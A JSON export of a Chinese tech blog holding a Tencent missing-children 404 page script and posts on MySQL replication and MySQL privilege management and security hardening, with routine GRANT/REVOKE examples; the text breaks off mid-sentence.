{"pages":[{"title":"","text":"404 - RocWong'blog var QZONE = window.QZONE || {}; function imagezoom(imgobj, box_w, box_h) { var src_w = imgobj.width; var src_h = imgobj.height; var r1 = src_w / src_h, r2 = box_w / box_h; var dst_w, dst_h; if (r1 > r2) { dst_w = box_w; dst_h = Math.round(dst_w / src_w * src_h); } else { if (r1 < r2) { dst_h = box_h; dst_w = Math.round(dst_h / src_h * src_w); } else { dst_w = box_w; dst_h = box_h; } } imgobj.style.marginLeft = (box_w - dst_w) / 2 + \"px\"; imgobj.style.marginTop = (box_h - dst_h) / 2 + \"px\"; imgobj.style.width = dst_w + \"px\"; imgobj.style.height = dst_h + \"px\"; imgobj.style.opacity = 1; } (function(_w, _d) { var ha = _d.head || _d.getElementsByTagName(\"head\")[0]; var $scope = {}; var current; var tmnow; var chId; var homePageUrl, homePageName; var scs = document.getElementsByTagName(\"script\"); if (location.href.indexOf(\"fm.qq.com\") > -1 || location.href.indexOf(\"fm.qzone.qq.com\") > -1) { homePageName = \"\\u8fd4\\u56de\\u4f01\\u9e45FM\"; homePageUrl = \"https://fm.qq.com\"; } else { if (location.href.indexOf(\"qzone.qq.com\") > -1) { homePageName = \"\\u8fd4\\u56de\\u6211\\u7684\\u7a7a\\u95f4\"; homePageUrl = \"https://qzone.qq.com\"; } else { homePageName = \"\\u8fd4\\u56de\\u817e\\u8baf\\u7f51\"; homePageUrl = \"https://www.qq.com\"; } } for (var i = 0;i < scs.length;i++) { if (scs[i].src.indexOf(\"/404/data.js\") > -1) { if (scs[i].getAttribute(\"homePageUrl\")) { homePageUrl = scs[i].getAttribute(\"homePageUrl\"); } if (scs[i].getAttribute(\"homePageName\")) { homePageName = scs[i].getAttribute(\"homePageName\"); } break; } } $scope.rettext = homePageName; $scope.retlink = homePageUrl; function getData(srcUrl, callback) { var sc = _d.createElement(\"script\"); function orc() { if (sc.readyState === \"loaded\") { setTimeout(function() { callback && callback(); }, 0); } } if (sc.addEventListener) { if (callback) { sc.addEventListener(\"load\", callback, false); } } else { sc.attachEvent(\"onreadystatechange\", orc); } ha && ha.appendChild(sc); sc.src = srcUrl; } function resolveData(d) { var tid, len, ddata = [], tdata; if (\"object\" == typeof d && (d.data && (len = d.data.length))) { for (var i = 0;i < len;i++) { d.data[i].child_pic = d.data[i].child_pic.replace(/^http/, \"https\"); var expire = d.data[i].expire; d.data[i]._id = new Date * Math.random() * Math.random() * 1E7; if (expire && tmnow * 1E3 < Date.parse(expire.replace(/\\s[\\s\\S]*$/, \"\").replace(/\\-/g, \"/\"))) { var _c = d.data[i].city, _p = d.data[i].province; if (_c && city) { if ((\"_\" + _c + \"_\").indexOf(\"_\" + city + \"_\") > -1) { ddata.push(d.data[i]); continue; } } if (_p && province) { if ((\"_\" + _p + \"_\").indexOf(\"_\" + province + \"_\") > -1) { ddata.push(d.data[i]); } } } } tid = Math.floor(Math.random() * (ddata.length || len)); tdata = (ddata.length ? ddata : d.data)[chId = tid]; if (_w.foundjsondata) { tdata.ta = tdata.sex.indexOf(\"\\u5973\") > -1 ? \"\\u5979\" : \"\\u4ed6\"; tdata.name = \"\\u201c7\\u00b718\\u7279\\u5927\\u62d0\\u5356\\u5a74\\u513f\\u6848\\u201d\\u544a\\u7834\\uff0c\\u88ab\\u89e3\\u6551\\u768415\\u540d\\u5b69\\u5b50\\u4e2d\\uff0c2\\u4eba\\u7531\\u4eb2\\u751f\\u7236\\u6bcd\\u9886\\u56de\\uff0c\\u4ecd\\u670913\\u540d\\u5b69\\u5b50\\u672a\\u627e\\u5230\\u4eb2\\u751f\\u7236\\u6bcd\\uff0c\\u88ab\\u5b89\\u7f6e\\u5728\\u60e0\\u5dde\\u5e02\\u793e\\u4f1a\\u798f\\u5229\\u9662\\uff0c\" + tdata.ta + \"\\u662f\\u5176\\u4e2d\\u4e4b\\u4e00\\u3002\"; tdata.url = tdata.url.replace(/#p=(\\d{1,2})/, function(a, n) { return \"#p=\" + (+n + 1); }); return format(tmpl2, tdata); } if (!tdata.ext1) { tdata.ext1 = \"\\u4f46\\u6211\\u4eec\\u53ef\\u4ee5\\u4e00\\u8d77\\u5bfb\\u627e\\u5931\\u8e2a\\u5b9d\\u8d1d\"; } return tdata; } } function setTopData(tdata) { current = tdata; $scope.topname = tdata.name; $scope.topgender = tdata.sex; $scope.topbirth = tdata.birth_time; $scope.toplostdate = tdata.lost_time; $scope.toplostplace = tdata.lost_place; $scope.toplostdesc = tdata.child_feature; $scope.toplink = tdata.url; $scope.topimg = tdata.child_pic; $scope.topid = tdata._id; document.body.innerHTML = template(\"body\", $scope); } function init(data) { tmnow = data.tm_now * 1E3; var tdata = resolveData(jsondata); $scope.whichin = 0; jsondata.data.splice(chId, 1); $scope.otherdata = [tdata].concat(jsondata.data.slice(0, 5)); setTopData(tdata); } var timeout; window._Callback = function(d) { clearTimeout(timeout); init(d); }; timeout = setTimeout(function() { _Callback({tm_now:(new Date).getTime() / 1E3}); }, 2E3); //getData(\"http://boss.qzone.qq.com/fcg-bin/fcg_zone_info\"); _w.share = function(target) { var summary = [\"\\u80cc\\u666f\\uff1a\", current.name, \"\\uff0c\\u6027\\u522b\\uff1a\", current.sex, \"\\uff0c\\u51fa\\u751f\\u65f6\\u95f4\\uff1a\", current.birth_time, \"\\uff0c\\u5931\\u8e2a\\u65f6\\u95f4\\uff1a\", current.lost_time, \"\\uff0c\\u7279\\u5f81\\u63cf\\u8ff0\\uff1a\", current.child_feature].join(\"\"); if (summary) { summary = \"#\\u5bfb\\u627e\\u5931\\u8e2a\\u7684\\u5b9d\\u8d1d#\" + summary; } var stitle = \"\\u5931\\u8e2a\\u7684\\u5b9d\\u8d1d\\u8be6\\u60c5\"; var desc = \"\\u5931\\u8e2a\\u7684\\u5b9d\\u8d1d\\u8981\\u56de\\u5bb6\\uff0c\\u5feb\\u6765\\u53c2\\u4e0e\\u7231\\u5fc3\\u7684\\u4f20\\u9012\\u5427\\uff01\"; var encode = encodeURIComponent; var opts = {\"surl\":\"https://qzone.qq.com/gy/404/\" + current.id + \"/lostchild.html\", \"site\":\"QQ\\u7a7a\\u95f4\", \"summary\":summary || \"#\\u5b9d\\u8d1d\\u56de\\u5bb6#\\u817e\\u8baf\\u5fd7\\u613f\\u8005\\u7528\\u6280\\u672f\\u70b9\\u4eae\\u516c\\u76ca\\uff0c\\u8ba9\\u6211\\u4eec\\u4e00\\u8d77\\u5bfb\\u627e\\u8d70\\u5931\\u7684\\u513f\\u7ae5\\u5427\\uff01\", \"stitle\":stitle, \"pics\":current.child_pic, \"desc\":desc, \"origin_url\":current.url}; var surl = opts.surl || \"https://www.qq.com/404/\", summary = opts.summary || \"\\u8fd9\\u4e2a\\u662f\\u5206\\u4eab\\u7684\\u5185\\u5bb9\", stitle = opts.stitle || \"\\u8fd9\\u4e2a\\u662f\\u5206\\u4eab\\u7684\\u6807\\u9898\", pics = opts.pics || \"https://qzonestyle.gtimg.cn/qzone_v6/act/img/20120422_qzone_7_years/pop_up/icon-pop-seven-years.png\", site = opts.site || \"\\u8fd9\\u4e2a\\u662f\\u5206\\u4eab\\u94fe\\u63a5\\u7684\\u6587\\u5b57\", desc = opts.desc || \"\\u5931\\u8e2a\\u7684\\u5b9d\\u8d1d\\u8981\\u56de\\u5bb6\\uff0c\\u5feb\\u6765\\u53c2\\u4e0e\\u7231\\u5fc3\\u7684\\u4f20\\u9012\\u5427\\uff01\", origin_url = opts.origin_url || \"https://www.qq.com/404/\"; var shareList = {weibo:{method:function(evt) { var w = \"http://v.t.qq.com/share/share.php\", q = [\"?site=\", encode(surl + \"#via=share_t_weib\"), \"&title=\", encode(summary), \"&pic=\", encode(pics), \"&url=\", encode(surl)].join(\"\"), p = [w, q].join(\"\"); openit(p, \"weibo\", \"width=700, height=680, top=0, left=0, toolbar=no, menubar=no, scrollbars=no, location=yes, resizable=no, status=no\"); }}, qzone:{method:function(evt) { var buff = [], ps = {url:surl + \"#via=404-qzoneshare\", desc:desc || \"\\u5931\\u8e2a\\u7684\\u5b9d\\u8d1d\\u8981\\u56de\\u5bb6\\uff0c\\u5feb\\u6765\\u53c2\\u4e0e\\u7231\\u5fc3\\u7684\\u4f20\\u9012\\u5427\\uff01\", summary:summary, title:stitle, pics:pics, site:site}; for (var k in ps) { buff.push(k + \"=\" + encode(ps[k] || \"\")); } var w = \"http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?\" + buff.join(\"&\"), q = [\"#via=share_t_qzone\", \"&title=\", encode(summary), \"&pic=\", encode(pics), \"&url=\", encode(surl)].join(\"\"), p = [w, q].join(\"\"); openit(p, \"qzone\", \"width=700, height=680, top=0, left=0, toolbar=no, menubar=no, scrollbars=no, location=yes, resizable=no, status=no\"); }}, sina:{method:function() { var w = \"http://v.t.sina.com.cn/share/share.php\", q = [\"?url=\", encode(surl + \"#via=share_x_weib\"), \"&title=\", encode(summary), \"&source=\", \"&sourceUrl=\", surl, \"&content=utf-8\", \"&pic=\", encode(pics)].join(\"\"), p = [w, q].join(\"\"); openit(p, \"sina\", \"toolbar=0,status=0,resizable=1,width=440,height=430\"); }}, kaixin:{method:function() { var n = \"http://www.kaixin001.com/repaste/bshare.php?rurl=\" + encode(surl + \"#via=share_kaixin\") + \"&rcontent=&rtitle=\" + encode(summary); openit(n, \"kaixin\", \"toolbar=0,status=0,resizable=1,width=600,height=360\"); }}, renren:{method:function() { var n = \"http://www.connect.renren.com/share/sharer?title=\" + encode(summary) + \"&url=\" + encode(surl + \"#via=share_renren\"), p = window.open(n, \"rr\", \"toolbar=0,status=0,resizable=1,width=510,height=300\"); if (p) { p.focus(); } }}, weixin:{method:function() { var n = \"https://qzone.qq.com/gy/404/page/qrcode.html?url=\" + encode(origin_url + \"#via=share_weixin\"), p = window.open(n, \"rr\", \"toolbar=0,status=0,resizable=1,width=620,height=430\"); if (p) { p.focus(); } }}}; var openit = function(u, n, p) { function o() { var z; if (!(z = window.open(u, n, p))) { location.href = u; } else { z.focus(); } } o(); }; shareList[target] && shareList[target].method(); }; _w.toThis = function(id) { for (var i = 0;i < $scope.otherdata.length;i++) { if ($scope.otherdata[i]._id == id) { setTopData($scope.otherdata[i]); break; } } return false; }; var meta = document.createElement(\"meta\"); meta.name = \"viewport\"; meta.content = \"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no\"; ha.appendChild(meta); (function registerStyle() { var link = document.createElement(\"link\"); link.rel = \"stylesheet\"; link.type = \"text/css\"; link.href = \"https://qzone.qq.com/gy/404/style/404style.css\"; ha.appendChild(link); })(); (function initStat() { var qqDomainNameRE = /\\.qq\\.com$/i, qzoneDomainNameRE = /\\bqzone\\.qq\\.com$/i, qzsDomainNameRE = /\\bqzonestyle\\.gtimg\\.cn$/i; function cb() { var url = location.host; var src = \"\"; if (qzoneDomainNameRE.test(url)) { src = \"new404.qzone\"; } else { if (qqDomainNameRE.test(url)) { src = \"new404.qq\"; } else { if (qzsDomainNameRE.test(url)) { src = \"new404.qzonestyle\"; } else { src = url.replace(\".\", \"_\"); } } } _w.TCISD && (_w.TCISD.pv && _w.TCISD.pv(\"hat.qzone.qq.com\", \"/gy/lostchild/\" + src)); } getData(\"https://qzonestyle.gtimg.cn/ac/qzfl/stat.js\", cb); })(); })(window, document); !function() { function a(a, b) { return(/string|function/.test(typeof b) ? h : g)(a, b); } function b(a, c) { return \"string\" != typeof a && (c = typeof a, \"number\" === c ? a += \"\" : a = \"function\" === c ? b(a.call(a)) : \"\"), a; } function c(a) { return l[a]; } function d(a) { return b(a).replace(/&(?![\\w#]+;)|[\"']/g, c); } function e(a, b) { if (m(a)) { for (var c = 0, d = a.length;d > c;c++) { b.call(a, a[c], c, a); } } else { for (c in a) { b.call(a, a[c], c); } } } function f(a, b) { var c = /(\\/)[^/]+\\1\\.\\.\\1/, d = (\"./\" + a).replace(/[^/]+$/, \"\"), e = d + b; for (e = e.replace(/\\/\\.\\//g, \"/\");e.match(c);) { e = e.replace(c, \"/\"); } return e; } function g(b, c) { var d = a.get(b) || i({filename:b, name:\"Render Error\", message:\"Template not found\"}); return c ? d(c) : d; } function h(a, b) { if (\"string\" == typeof b) { var c = b; b = function() { return new k(c); }; } var d = j[a] = function(c) { try { return new b(c, a) + \"\"; } catch (d) { return i(d)(); } }; return d.prototype = b.prototype = n, d.toString = function() { return b + \"\"; }, d; } function i(a) { var b = \"{Template Error}\", c = a.stack || \"\"; if (c) { c = c.split(\"\\n\").slice(0, 2).join(\"\\n\"); } else { for (var d in a) { c += \"\\n\" + a[d] + \"\\n\\n\"; } } return function() { return \"object\" == typeof console && console.error(b + \"\\n\\n\" + c), b; }; } var j = a.cache = {}, k = this.String, l = {\"\":\"&#62;\", '\"':\"&#34;\", \"'\":\"&#39;\", \"&\":\"&#38;\"}, m = Array.isArray || function(a) { return \"[object Array]\" === {}.toString.call(a); }, n = a.utils = {$helpers:{}, $include:function(a, b, c) { return a = f(c, a), g(a, b); }, $string:b, $escape:d, $each:e}, o = a.helpers = n.$helpers; a.get = function(a) { return j[a.replace(/^\\.\\//, \"\")]; }, a.helper = function(a, b) { o[a] = b; }, \"function\" == typeof define ? define(function() { return a; }) : \"undefined\" != typeof exports ? module.exports = a : this.template = a, a(\"body\", function(a) { var b = this, c = (b.$helpers, b.$escape), d = a.retlink, e = a.rettext, f = a.topid, g = a.topimg, h = a.topname, i = a.topgender, j = a.topbirth, l = a.toplostdate, m = a.toplostplace, n = a.toplostdesc, o = a.toplink, p = b.$each, q = a.otherdata, r = (a.otheritem, a.index, \"\"); return r += ' 404\\uff0c\\u60a8\\u8bbf\\u95ee\\u7684\\u9875\\u9762\\u627e\\u4e0d\\u56de\\u6765\\u4e86\\uff0c\\u4f46\\u6211\\u4eec\\u53ef\\u4ee5\\u4e00\\u8d77\\u5e2e\\u4ed6\\u4eec\\u56de\\u5bb6\\uff01 ', r += c(e), r += ' ', r += c(h), r += '(', r += c(i), r += ') \\u51fa\\u751f\\u65e5\\u671f\\uff1a', r += c(j), r += ' \\u5931\\u8e2a\\u65f6\\u95f4\\uff1a', r += c(l), r += ' \\u5931\\u8e2a\\u5730\\u70b9\\uff1a', r += c(m), r += ' \\u5931\\u8e2a\\u4eba\\u7279\\u5f81\\u63cf\\u8ff0\\uff1a', r += c(n), r += ' \\u67e5\\u770b\\u8be6\\u60c5 \\u5206\\u4eab \\u817e\\u8baf\\u5fae\\u535a QQ\\u7a7a\\u95f4 \\u65b0\\u6d6a\\u5fae\\u535a \\u5fae\\u4fe1 ', p(q, function(a) { r += ' '; }), r += \" \", new k(r); }); }(); L2Dwidget.init({\"pluginRootPath\":\"live2dw/\",\"pluginJsPath\":\"lib/\",\"pluginModelPath\":\"assets/\",\"tagMode\":false,\"debug\":false,\"model\":{\"scale\":1,\"hHeadPos\":0.5,\"vHeadPos\":0.618,\"jsonPath\":\"https://cdn.jsdelivr.net/npm/live2d-widget-model-koharu@1.0.5/assets/koharu.model.json\"},\"display\":{\"superSample\":2,\"position\":\"right\",\"width\":150,\"height\":300,\"hOffset\":0,\"vOffset\":-20},\"mobile\":{\"show\":false,\"scale\":0.5},\"react\":{\"opacityDefault\":0.7,\"opacityOnHover\":0.2},\"log\":false});","path":"404.html","date":"10-08","excerpt":""},{"title":"404","text":"","path":"40/index.html","date":"04-09","excerpt":""},{"title":"archives","text":"","path":"archives/index.html","date":"04-09","excerpt":""},{"title":"分类","text":"","path":"categories/index.html","date":"04-09","excerpt":""},{"title":"search","text":"","path":"search/index.html","date":"04-09","excerpt":""},{"title":"tags","text":"","path":"tags/index.html","date":"04-09","excerpt":""},{"title":"about","text":"","path":"about/index.html","date":"04-09","excerpt":""}],"posts":[{"title":"MySQL-复制","text":"MySQL从3.23开始提供复制功能，是指将主数据库的DDL和DML操作通过二进制日志传到复制数据库上，然后在从库上对这些日志重新执行，从而使得从库和主库的数据保持同步MySQL支持一台主库同时向多态从库进行复制，从库同时可以作为其他服务器的主库，实现链状复制。如果主库出现问题，可以快速切换到从库提供服务；可以在从库上执行查询操作，降低主库的访问压力（因为复制是异步复制，所以对于实时性要求较高的服务还是要从主库中获取）；可以在从库上执行备份，以免备份期间影响主库的服务 复制概述MySQL复制流程 MySQL主库在事务提交时把数据变更作为时间Events记录在二进制日志文件中Binlog中；MySQL主库上的sync_binlog参数控制Binlog日志刷新到磁盘 主库推送二进制日志文件Binlog中的事件到从库中继日志Relay Log，之后从库更具中继日志Relay Log重新做数据变更操作，通过逻辑复制以此来达到主库和从库的数据一直 MySQL复制通过三个线程完成，Binlog Dump线程跑在主库上，I/O线程和SQL线程跑在从库上。当从库上启动Start Slave时，首先创建I/O线程连接主库，主库随后创建Binlog Dump线程读取数据库事件并发送给I/O线程，I/O线程获取到事件数据后更新到从库的中继日志Relay Log中去，之后从库上的SQL线程读取中继日志Relay Log中更新的数据库事件并应用 graph TB D-->|4.SQL线程应用中继日志中的事件|A B-->|DML Commands|C(BinLog) A(Slave Database)-->|1.从库连接主库|B(Master Database) C-->|3.Binlog dump线程读取数据库事件并把数据发给I/O线程|D(Relay Log) A-->|2.I/O线程向主库要求数据|B 通过show processlist命令在主库上查看Binlog Dump线程，从Binlog Dump线程的状态可以看到，MySQL的复制是主库主动推送日志到从库去的，是属于推日志的方式来做同步","path":"2019/10/11/MySQL-复制/","date":"10-11","excerpt":"MySQL从3.23开始提供复制功能，是指将主数据库的DDL和DML操作通过二进制日志传到复制数据库上，然后在从库上对这些日志重新执行，从而使得从库和主库的数据保持同步MySQL支持一台主库同时向多态从库进行复制，从库同时可以作为其他服务器的主库，实现链状复制。如果主库出现问题，可以快速切换到从库提供服务；可以在从库上执行查询操作，降低主库的访问压力（因为复制是异步复制，所以对于实时性要求较高的服务还是要从主库中获取）；可以在从库上执行备份，以免备份期间影响主库的服务","tags":[]},{"title":"MySQL-权限与安全","text":"MySQL权限管理权限系统的工作原理权限系统分为两个阶段 对连接的用户进行身份认证，合法的用户通过认证，不合法的用户拒绝连接 身份认证是通过IP地址和用户名联合进行验证。例如root@localhost，只能接受root以localhost登陆，其他的地址登陆都将拒绝，就算用户名相同，但是IP不同，也会认为非同一个用户 对通过认证的合法用户赋予相对应的权限，用户可以在这些权限范围内对数据库做相应的操作 mysql的权限表在数据库启动的时候就载入内存，当用户通过身份认证后，就在内存中进行相应的权限的存取 权限表的存取在权限存取的两个过程中会用到mysql数据库中的user、host、db这三个权限表 表名（按照使用频率排序） user db host 用户列 host host host user db db password user 权限列 select_priv select_priv select_priv insert_priv insert_priv insert_priv update_priv update_priv update_priv delete_priv delete_priv delete_priv index_priv index_priv index_priv alter_priv alter_priv alter_priv create_priv create_priv create_priv drop_priv drop_priv drop_priv grant_priv grant_priv grant_priv create_view_priv create_view_priv create_view_priv show_view_priv show_view_priv show_view_priv create_routine_priv create_routine_priv alter_routine_priv alter_routine_priv references_priv references_priv references_priv reload_priv shutdown_priv process_priv file_priv show_db_priv super_priv create_tmp_table_priv create_tmp_table_priv create_tmp_table_priv lock_tables_priv lock_tables_priv lock_tables_priv execute_priv repl_slave_priv repl_client_priv 安全列 ssl_type ssl_cipher x509_issuer x509_subject 资源控制列 max_questions max_updates max_connections max_user_connections user表分为四个部分：用户列、权限列、安全列、资源控制列，通常使用的最多的是用户列和权限列。权限列又分为普通权限和管理权限。普通权限（select_priv/create_priv…)主要用于数据库的操作，管理权限（process_priv/super_priv…)用来对数据进行管理 用户连接时权限表的存取分为两个阶段 从user表中的host，user和password这三个字段中判断连接的IP、用户名和密码是否存在于表中，如果存在则通过身份验证，否则拒绝连接 如果通过身份验证，则按照user-&gt;db-&gt;table_priv-&gt;columns_priv权限表顺序得到数据库权限，这几个权限表中，全县范围依次递减，全局权限覆盖局部权限 添加roc用户并设置host，并且赋予所有数据库上的所有select权限 1234567891011121314# 创建用户create user 'roc'@'192.168.88.1' identified by '4795';# 赋予所有数据库上的所有select权限grant select on *.* to 'roc'@'192.168.88.1';# 查询此用户的权限select * from user where user='roc' and host='192.168.88.1' \\G***************************[ 1. row ]***************************Host | 192.168.88.1User | rocSelect_priv | YInsert_priv | N 查询db表后发现db表没有roc的设置，说明如果对于所有表的操作权限相同将不记录在db表中 123456select count(1) from db where user='roc' and host='192.168.88.1'+----------+| count(1) |+----------+| 0 |+----------+ 将刚刚创建的用户修改为只有test数据库的select权限 1234567891011121314151617181920# 删除用户对所有表select的权限revoke select on *.* from roc@192.168.88.1;# 赋予用户test库的select权限grant select on test.* to 'roc'@'192.168.88.1';# 查询用户目前在user表中的权限，select_priv权限由y改为nselect * from user where user='roc' and host='192.168.88.1' \\G***************************[ 1. row ]***************************Host | 192.168.88.1User | rocSelect_priv | NInsert_priv | N# 查找db表中的用户权限，发现对test表有select_priv权限select * from db where user='roc' and host='192.168.88.1' \\G***************************[ 1. row ]***************************Host | 192.168.88.1Db | testUser | rocSelect_priv | YInsert_priv | N 所以用户通过权限验证后，进行权限分配时，将按照user-&gt;db-&gt;table_priv-&gt;columns_priv的顺序进行权限分配，如果当前表中的权限为Y那么就不会再检查后面的权限表，如果当前表中为N，则到下一个表中检查是否拥有权限。 账号管理账号管理主要包括账号的创建、权限更改、和账号的删除、 创建账号 使用grant语法创建 12345678910111213141516171819202122232425262728293031323334353637 grant priv_type [(column_list)] [,priv_type [(column_list)]] ... on [object_type] [tbl_name | * | *.* |db_name.*] to user[identified by [password] 'password'] [, user[identified by [password] 'password'] ] ... [with grant option]; # object_type # table # function # procedure # 创建用户，赋予所有数据库的所有权限，只能从本地连接grant all privileges on *.* to roc@localhost; # 上面的创建无法赋予grant_priv权限，在上面的基础上赋予grant_privgrant all privileges on *.* to roc@localhost with grant option; # 在上面的基础上添加密码4795grant all privileges on *.* to roc@localhost identified by '4795' with grant option; # 创建一个对test数据库有select、update、insert、delete操作，密码为123的用户grant select,insert,update,delete on test.* to 'roc2'@'%' identified by '123'; # host 中localhost是只本地连接，但是也可以使用通配符'%'/'_'# 如果通配符中出现多个匹配，服务器将会以下选择# 服务器在启动时读入user表后进行排序# 然后当用户试图连接时，以排序的顺序浏览条目# 服务器使用于客户端和用户名匹配的第一行# 首先以最具体的host值排序# 有相同的host值将以最具体的user值排序 # 授予super、process、file权限给用户，因为这都是管理权限，只能接*.*，否则会报错grant super,process, file on *.* to 'roc3'@'%'; # 只授权登陆权限grant usage on *.* to 'roc4'@'localhost'; ​ 直接操作授权表 123456789# 只授权登陆权限grant usage on *.* to 'roc4'@'%';# 直接操作授权表插入权限insert into db(host,db,user,select_priv,insert_priv, update_priv, delete_priv) values('%','test', 'roc4','Y','Y','Y','Y');# 刷新权限flush privileges; 查看账号权限 show grants for user@host，host不写时默认为% 通过SCHEMA_PRIVILEGES数据库查询，select * from SCHEMA_PRIVILEGES where GRANTEE=&quot;&#39;user&#39;@&#39;host&#39;&quot;; 更改用户权限可以对用户的权限进行新增和回收 通过grant新增和revoke回收增加权限 12345678# 创建一个只有登陆权限的用户grant usage on *.* to 'roc'@'localhost';# 给这个用户增加select所有库和表的权限grant select on *.* to 'roc'@'localhost';# 继续添加insert权限grant insert on *.* to 'roc'@'localhost'; 回收权限 12# revoke 无法回收usage权限， 所以revoke无法删除用户revoke select , insert on *.* from roc@localhost; 更改权限表123456# 回收roc4@localhost用户在test库的select权限update db set `Select_priv`='N' where user='roc4' anddb = 'test' and host='localhost';# 添加roc4@localhost用户所有表的select权限update user set select_priv='Y' where user='roc4' and host='localhost'; 修改账户密码使用mysqladmin工具修改1mysqladmin -u username -h host_name password \"new password\" 执行set password修改12# 如果修改的是自己的密码可以不用写forset password for 'user'@'host' = password('new password'); GRANT USAGE在全局级别使用grant usage在*.*指定某个账户的密码，这样不会影响当前的权限 1grant usage on *.* to 'user'@'localhost' identified by 'new password'; 直接修改数据表123456789# 修改用户密码update user set authentication_string=password('123')where user='roc4' and host='localhost';# 更新用户表flush privileges;# 为了安全起见，不应该明文设置密码，应该通过其他方式获取到md5的加密码后直接设置加密的md5set password for 'user'@'host' = 'md5加密串'; 删除账号DROP USER1drop user 'user'@'host'; 修改权限表123delete from user where user='roc4' and host='host';flush privileges; 账号资源管理账号的资源包括 单个账号每小时执行的查询次数 单个账号每小时执行的更新次数 单个账号每小时连接服务器的次数 单个账号并发连接服务器的次数 账号资源可以防止由于程序bug或者系统遭到攻击，使得某些应用短时间内发生了大量的点击，从而对数据库造成严重的并发访问导致数据库down掉，所以通过账号资源限制一旦达到限制数则提示资源不足，不会再分配资源给此账户 设置资源限制可以通过grant ... with option设置 option有以下几个选项 MAX_QUERIES_PER_HOUR count:每小时最大查询次数 MAX_UPDATE_PER_HOUR count:每小时最大更新次数 MAX_CONNECTIONS_PER_HOUR count:每小时最大连接次数（一段时间内） MAX_USER_CONNECTIONS count:最大用户连接数（某个时间点） 系统还有一个MAX_USER_CONNECTIONS设置，如果用户设置的为0，则使用全局参数值 1234567# 设置用户的每小时最大查询数量和最大连接数grant select on test.* to 'user'@'host' with max_queries_per_hour 3 max_user_connections 2;# 查询用户的每小时最大查询数，更新数，连接数select user, max_questions, max_updates, max_user_connections from user where user='user';# 查询数限制的时候并不一定非得执行了N次select操作，因为show、desc等语句都隐式的包含在内 如果达到数量后要继续操作，只能清除相关的累加值，可以使用flush user_resources/flush privileges/mysqladmin reload命令清除，重启数据库也可以清除累加值 如果要修改资源数限制可以同设置的方法一直，如果要删除限制则设置此参数为0即可 MySQL安全问题操作系统的安全问题 严格控制操作系统账号和权限 锁定mysql用户 其他任何用户都采取独立的账号登陆，管理员通过mysql专有用户管理mysql，或者通过root su 到mysql用户下进行管理 mysql用户目录下，除了数据文件目录，其他文件和目录都改为root所属 尽量避免root权限运行MySQL 安装MySQL后设置mysql专有用户，如果用root启动MySQL，任何拥有FILE权限的用户都能够读写root用户的文件，这样会造成安全隐患 防止DNS欺骗 创建用户时host可以指定域名或者IP地址，但是如果指定域名，就可能因为域名对应ip地址被恶意修改从而导致数据库被恶意IP访问导致安全隐患 数据库安全问题 删除匿名账号或者给匿名账号添加密码 给root账户设置密码 设置安全密码 长度6位以上并且数字、字母、特殊符号混合 使用期间的安全 登陆时将密码明文输入mysql -u root -p123最不安全 交互式输入密码mysql -u root -p 写入my.cnf配置文件 1234567[client]user=usernamepassword=password# 对配置文件严格权限限制chmod +600 my.cnf 只授予账号必须的权限 不要轻易的赋予all privileges权限 除root外，任何用户不应该有mysql库user表的存取权限 不要将file/process/super权限授予管理员以外的账号 file：可以通过select ... into outfile ...写到服务器上有权限写入的目录下，作为文本格式存放；可以将有读取权限的文本文件通过load data infile命令写入数据库表，如果表中含有重要数据将造成巨大隐患 process:可以看到processlist中所有用户线程待执行的语句，有可能会泄露语句中的重要密码 super：可以执行kill命令，终止其他用户进程 LOAD DATA LOCAL安全问题 LOAD DATA默认读取服务器上的文件，但是加上LOCAL参数后就可以将本地具有访问权限的文件加载到数据库中。即可以任意加载本地文件到数据库中，或者在Web环境中，客户从Web服务器连接，用户可以使用LOAD DATE LOCAL语句来读取Web服务器进程有读取访问权限的任意文件，这个时候MySQL服务器的客户实际上是Web服务器，而不是连接Web服务器的用户运行程序 可以用--local-infole=0选项启动mysqld，从服务器端禁用所有LOAD DATA LOCAL命令 使用MERGE存储引擎潜藏的安全漏洞 赋予表T权限给用户X， X建立一个包含T的MERGE表T1，当用户X对表T的权限被收回时，用户X仍然可以通过T1访问T表的数据 DROP TABLE/DATABASE命令并不收回以前的相关访问授权 drop表或者库的时候权限表对此[库|表]的权限并没有被收回，当再次创建的时候原本拥有权限的用户仍然可以继续操作，所以在drop [table|database]的时候需要取消其他用户在此[库|表]的权限 使用SSL ssl提供：认证用户和服务器，确保数据发送到正确的客户机和服务器；加密数据以防止数据中途被窃取；维护数据的完整性，确保数据在传输过程中不被改变 服务器上设置–ssl表示可以用ssl连接，客户端上不仅此选项，还需要指定--ssl-ca:含可信SSL CA的清单的文件的路径、--ssl-cert:ssl证书文件名，用于建立安全连接 、--ssl-key： 密钥文件名，用于建立安全连接。如果不想启用SSL可以将选项指定为--skip-ssl或--ssl=0。确保使用SSL连接的安全方式是创建用户的时候加上require ssl字句 1grant select on *.* to user identified by '123' require ssl; 如果可能，给所有用户加上访问IP 让只有符合授权的IP或者HOSTNAME才可以进行数据库访问 REVOKE命令的漏洞 当用户被多次授权后，需要将用户的权限全部取消，revoke命令可能不会按照我们的意愿执行。因为MySQL在一个数据库上多此赋权的时候权限会自动合并，但是在多个数据库上多次赋权，每个数据库上都会认为是单独的一组权限，必须在此数据库上用revoke命令来单独进行权限收回，而revoke all privileges on *.*并不会替用户完成这个过程 其他安全设置选项old-passwords在4.1之前password函数生成的密码是16位，4.1后改进为41位。当4.1以后的客户端连接4.1以前的客户端时没有问题， 因为新的客户端理解新旧两种加密算法，但是反过来4.1前的客户端连接4.1以后的服务器由于无法理解新的密码算法，导致服务器上出现无法认证的情况。可以在配置文件中[mysqld]增加old-passwords参数后启动，则set password，grant，password()操作产生的新密码全部变成旧的密码格式，但是这样会降低系统安全性，mysql5.7无法开启 safe-user-create此参数如果启用，用户将不能用grant语句创建新用户，除非用户有mysql数据库总user表的insert权限。 12# 给用户赋予创建新用户权限grant insert(user) on mysql.user to 'username'@'host'; secure-auth此参数可以强制4.1以前的客户端无法连接，即使使用了old-password参数也不行。mysql5.7之后拒绝关闭 skip-grant-tables此选项导致服务器根本不使用权限系统，从而给每个人以完全访问所有数据库的权利。 通过mysqladmin flush-privileges 、 mysqladmin reload或者flush privileges可以让一个正在运行的服务器再次开始使用授权表 skip-network在网上不允许TCP/IP连接，所有到数据库的连接必须由命名管道、共享内存、或者UNIX套接字文件进行，适合应用和数据库共用一台服务器的情况，大大增强安全性，但是维护困难 skip-show-database未开启前是允许任何用户可以执行show databases命令，但是只显示此用户可以操作的数据库，开启后只允许show 